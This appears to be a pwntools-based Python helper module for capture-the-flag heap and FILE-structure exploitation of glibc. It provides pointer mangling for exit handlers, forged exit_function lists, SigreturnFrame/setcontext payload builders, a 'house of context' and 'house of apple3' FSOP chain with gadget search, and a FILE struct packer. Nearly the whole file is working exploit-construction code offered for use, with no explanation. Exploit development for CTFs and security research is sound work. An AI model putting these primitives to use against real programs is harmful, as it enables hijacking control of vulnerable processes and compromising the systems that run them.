from pwn import *
from .io_file import IO_FILE_plus_struct

def proc_maps_parser(data):
    """
    Read /proc/self/maps, return a clean mapping.
    """
    mappings = {}
    for line in data.split("\n"):
        addr, file = line.split()[0], line.split()[-1]
        if file not in mappings:
            mappings[file] = int(addr.split("-")[0],16)
    return mappings

def ror(n,r):
    return (2**64-1)&(n>>r|n<<(64-r))

def rol(n,r):
    return ror(n,64-r)

def mangle(ptr,key):
    return rol(ptr^key,0x11)

def demangle(ptr,key):
    return ror(ptr,0x11)^key
    
def fake_exit_function(funcs: list[tuple[int,int]], key: int):
	if len(funcs) > 32:
		warn("Function count is greater than expected limit")
	exit_func = flat( 
		0, # ptr to next exit_function_list
		len(funcs) # length of this list
	)
	for func in funcs[::-1]: # libc goes through the exit functions in reverse
		payload = flat(
			4, # exit function type ef_cxa
			mangle(func[0],key), # mangled func ptr
			func[1], # argument
			0 # dso_handle (unused)
			)
		exit_func += payload
		
	return exit_func

def setcontext(regs, addr):
    if (not regs.get('rsp')) and addr:
        warn("rsp not set! this will crash")
    frame = SigreturnFrame()
    for reg, val in regs.items():
        setattr(frame, reg, val)
    # needed to prevent SEGFAULT
    setattr(frame, "&fpstate", addr+0x1a8)
    fpstate = {
    0x00: p16(0x37f),	# cwd
    0x02: p16(0xffff),	# swd
    0x04: p16(0x0),		# ftw
    0x06: p16(0xffff),	# fop
    0x08: 0xffffffff,	# rip
    0x10: 0x0,			# rdp
    0x18: 0x1f80,	    # mxcsr
    # 0x1c: mxcsr_mask
    # 0x20: _st[8] (0x10 bytes each)
    # 0xa0: _xmm[16] (0x10 bytes each)
    # 0x1a0: int reserved[24]
    # 0x200: [end]
    }
    return flat({
    0x00 : bytes(frame),
    #	0xf8: 0					# end of SigreturnFrame
    0x128: 0,				# uc_sigmask
    0x1a8: fpstate,			# fpstate
    })

# setcontext32 but twice as small and works past 2.38
# tldr is stdin filestream has a bunch of scratch space behind it
# so we can write a ucontext_t there then fsop to setcontext
# HOWEVER only happens on exit. if this is a problem you can fsop stdout to call exit.
def house_of_context(libc,**kwargs) -> (int, bytes):
    assert context.bits == 64, "only support amd64!"
    
    # add rdi, 0x10; jmp rcx
    gadget = next(libc.search(b'\x48\x83\xc7\x10\xff\xe1',executable=True))
    stdin_addr = libc.sym["_IO_2_1_stdin_"]
    begin = stdin_addr - len(setcontext({}, 0))
    
    kwargs.setdefault('rsp',libc.sym['__pthread_keys']+0x2000)
    kwargs['uc_stack.ss_flags'] = gadget # fsop payload calls this, useless for pwn
    buf = setcontext(kwargs,begin)
    
    # ensure alignment so we can tcache poison
    padding = begin & 0x8
    begin -= padding
    buf = b'A'*(padding) + buf
    
    setctx = libc.sym['setcontext']
    
    # house of apple3
    fp = IO_FILE_plus_struct()
    fp.flags = 1
    fp._IO_read_ptr = setctx+0x4
    fp._IO_read_end = setctx+0x3
    fp._IO_write_ptr = 1
    fp._IO_write_end = 2
    fp._IO_save_end = begin-0x10+padding
    fp._lock = libc.sym['__pthread_keys']
    fp._codecvt = (stdin_addr-0x38) + 0x58
    fp._wide_data = stdin_addr + 0x8 - 0x18
    fp._mode = 1
    fp.vtable = libc.sym['_IO_file_jumps']
    
    return begin, buf+bytes(fp)

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    file_struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    file_struct = file_struct.ljust(0x88, b"\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, b"\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, b'\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, b"\x00")
    return file_struct

"""
TODO: blind dump elf with format string
"""